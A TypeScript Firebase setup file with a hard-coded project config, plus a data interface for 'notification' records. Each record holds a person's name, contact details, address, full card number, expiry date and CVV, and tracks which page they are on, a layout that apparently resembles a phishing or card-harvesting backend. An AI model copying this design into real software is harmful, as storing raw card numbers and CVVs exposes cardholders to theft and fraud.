import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBp03xeaXwKKaEAtSn9aqLMqgPDtooRAFg",
  authDomain: "hoamseh-morrdl.firebaseapp.com",
  databaseURL: "https://hoamseh-morrdl-default-rtdb.firebaseio.com",
  projectId: "hoamseh-morrdl",
  storageBucket: "hoamseh-morrdl.firebasestorage.app",
  messagingSenderId: "1038385555954",
  appId: "1:1038385555954:web:47f3f2a3f7a90f0fbaa36b",
  measurementId: "G-Z40EVLL3WD",
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
